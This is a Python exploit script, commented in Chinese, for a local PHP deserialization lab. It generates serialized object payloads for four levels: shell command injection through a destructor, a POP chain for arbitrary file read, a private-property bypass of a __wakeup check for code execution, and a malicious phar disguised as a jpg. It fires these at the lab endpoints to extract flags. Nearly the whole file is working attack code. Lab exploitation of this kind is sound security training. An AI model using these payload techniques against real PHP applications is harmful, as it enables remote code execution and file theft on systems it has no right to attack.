#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
PHP 反序列化靶场 —— 一键利用脚本（纯标准库，零依赖）

用法:
    python3 php_exp.py l1        # 魔术方法 → RCE
    python3 php_exp.py l2        # POP 链 → 任意文件读
    python3 php_exp.py l3        # private 属性 + 假校验 → RCE
    python3 php_exp.py l4        # phar → 任意文件复制（走 PHP 7.4 容器）
    python3 php_exp.py all

前提: docker compose up -d 已起，8890(PHP 8.1) / 8891(PHP 7.4) 可访问。
"""

import argparse
import re
import subprocess
import sys
import urllib.parse
import urllib.request

BASE81 = 'http://127.0.0.1:8890'
BASE74 = 'http://127.0.0.1:8891'
CONTAINER81 = 'deser-php'
CONTAINER74 = 'deser-php74'

FLAG_RE = re.compile(r'FLAG\{[^}\n]+\}')


# ---------------------------------------------------------------- 序列化原语

def s_str(text):
    """序列化一个字符串：长度必须按 UTF-8 字节数算，不是字符数。"""
    raw = text.encode('utf-8')
    return 's:%d:"%s";' % (len(raw), text)


def s_int(n):
    return 'i:%d;' % n


def obj(cls, props):
    """props: [(key, 序列化后的值), ...] —— 自动算属性个数。"""
    body = ''.join(s_str(k) + v for k, v in props)
    return 'O:%d:"%s":%d:{%s}' % (len(cls.encode()), cls, len(props), body)


# ---------------------------------------------------------------- 四关 payload

def payload_l1(cmd='cat /flag'):
    """
    Cache::__destruct() 里执行  system('rm -rf /tmp/cache/' . $key)
    $key 直接拼进 shell —— 用 ; 断句，再 ;echo 收尾把残留参数吃掉。
    """
    key = 'x;' + cmd + ';echo '
    return obj('Cache', [('key', s_str(key)), ('ttl', s_int(1))])


def payload_l2(path='/flag'):
    """
    三跳链:
      Page::__destruct  → $renderer->render()      (不存在 → __call)
      Renderer::__call  → echo $this->engine       (对象当字符串 → __toString)
      Engine::__toString→ file_get_contents($tpl)  ← sink
    """
    engine = obj('Engine', [('tpl', s_str(path)), ('vars', 'a:0:{}')])
    renderer = obj('Renderer', [('engine', engine)])
    return obj('Page', [('title', s_str('x')), ('renderer', renderer)])


def payload_l3(cmd='cat /flag', token='internal-node-v1'):
    """
    Gate::$cmd 是 private，序列化串里的真实属性名是  \\0Gate\\0cmd
    __wakeup 只在 token 不匹配时才重置 cmd，而 token 的期望值就写在源码里。
    """
    private_cmd = '\x00Gate\x00cmd'     # NUL + 类名 + NUL + 属性名
    return obj('Gate', [(private_cmd, s_str(cmd)), ('token', s_str(token))])


# ---------------------------------------------------------------- HTTP

def http_get(url, params=None):
    if params:
        url = url + '?' + urllib.parse.urlencode(params)
    with urllib.request.urlopen(url, timeout=10) as resp:
        return resp.read().decode('utf-8', 'replace')


def post_raw(url, blob):
    req = urllib.request.Request(url, data=blob, method='POST')
    with urllib.request.urlopen(req, timeout=10) as resp:
        return resp.read()


# ---------------------------------------------------------------- 各关

def run_l1():
    pl = payload_l1()
    print('[L1] payload: %s' % pl)
    body = http_get(BASE81 + '/l1.php', {'data': pl})
    m = FLAG_RE.search(body)
    return m.group(0) if m else _fail(body)


def run_l2():
    pl = payload_l2()
    print('[L2] payload: %s' % pl)
    body = http_get(BASE81 + '/l2.php', {'data': pl})
    m = FLAG_RE.search(body)
    return m.group(0) if m else _fail(body)


def run_l3():
    pl = payload_l3()
    print('[L3] payload: %s' % pl.replace('\x00', '\\0'))
    body = http_get(BASE81 + '/l3.php', {'data': pl})
    m = FLAG_RE.search(body)
    return m.group(0) if m else _fail(body)


def run_l4():
    """
    phar 这条路不需要 unserialize()：
      1. 容器内生成恶意 phar，伪装成 jpg 放到 uploads/
      2. 请求 l4.php?file=uploads/evil.jpg
      3. file_exists('phar://...') 解析 metadata → Thumb::__destruct → copy('/flag', 'uploads/flag_copy.txt')
      4. 直接访问那个 txt
    """
    print('[L4] 生成恶意 phar（PHP 7.4 容器内）...')
    out = subprocess.run(
        ['docker', 'exec', CONTAINER74, 'php', '-d', 'phar.readonly=0', '/poc/gen_phar.php'],
        capture_output=True, text=True)
    print(out.stdout.strip() or out.stderr.strip())

    print('[L4] 触发 phar:// 解析 ...')
    body = http_get(BASE74 + '/l4.php', {'file': 'uploads/evil.jpg'})
    if '归档正常' not in body:
        return _fail(body)

    print('[L4] 读取被复制出来的 flag ...')
    text = http_get(BASE74 + '/uploads/flag_copy.txt')
    m = FLAG_RE.search(text)
    return m.group(0) if m else _fail(text)


def _fail(body):
    print('   未匹配到 flag，响应片段:\n   ' + body[-500:].replace('\n', '\n   '))
    return None


# ---------------------------------------------------------------- main

def main():
    ap = argparse.ArgumentParser()
    ap.add_argument('level', choices=['l1', 'l2', 'l3', 'l4', 'all'])
    args = ap.parse_args()

    targets = ['l1', 'l2', 'l3', 'l4'] if args.level == 'all' else [args.level]
    results = {}
    for lv in targets:
        print('\n=== %s ===' % lv.upper())
        try:
            results[lv] = globals()['run_' + lv]()
        except Exception as e:
            print('   异常: %r' % e)
            results[lv] = None

    print('\n===== 汇总 =====')
    for lv in targets:
        print('  %s: %s' % (lv.upper(), results[lv] or 'FAIL'))
    return 0 if all(results.values()) else 1


if __name__ == '__main__':
    sys.exit(main())
